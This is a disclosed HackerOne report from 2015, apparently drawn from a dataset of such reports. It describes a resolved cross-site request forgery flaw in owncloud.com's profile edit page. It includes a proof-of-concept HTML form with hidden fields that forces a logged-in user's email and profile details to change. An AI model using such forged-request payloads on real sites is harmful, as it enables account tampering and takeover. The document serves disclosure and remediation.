---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '83239'
original_report_id: '83239'
title: 'owncloud.com: Allowed an attacker to force a user to change profile details.
  (XCSRF)'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: owncloud
created_at: '2015-08-18T19:46:36.418Z'
disclosed_at: '2015-09-11T09:08:23.003Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# owncloud.com: Allowed an attacker to force a user to change profile details. (XCSRF)

## Metadata

- HackerOne Report ID: 83239
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: owncloud
- Disclosed At: 2015-09-11T09:08:23.003Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Allowed an attacker to force a user to change profile details. (XCSRF)

A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists. There is no mitigation of Cross-Site Request Forgery (XCSRF) in edit profiles at https://owncloud.com/account/ 


The vulnerability resided in edit profile and allowed an attacker to force a user to change profile details. The attacker could employ a malicious web page with the  following HTML code and ask the user to click the submit form. then the user was not able to understand what was really happening.


###Reproduction Instructions / Proof of Concept:
```
  <form action="https://owncloud.com/account/" method="POST">
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;email" value="asdasdwqkgei&#64;yahoo&#46;com" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;first&#95;name" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;last&#95;name" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;display&#95;name" value="test "/>
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;user&#95;type" value="Other" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;company" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;title" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;salutation" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;address&#95;1" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;city" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;state" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;country" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;employees" value="test;" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;planed&#95;users" value="asdasdwqkgei" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;phone&#95;number" value="test" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;file" value="" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;password1" value="" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;password2" value="" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;sc&#95;profile&#95;save" value="" />
      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;save" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

###Suggested fix:

Using crumbs to protect your PHP API (Ajax) call from Cross-site request forgery (CSRF/XSRF) and other vulnerabilities.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
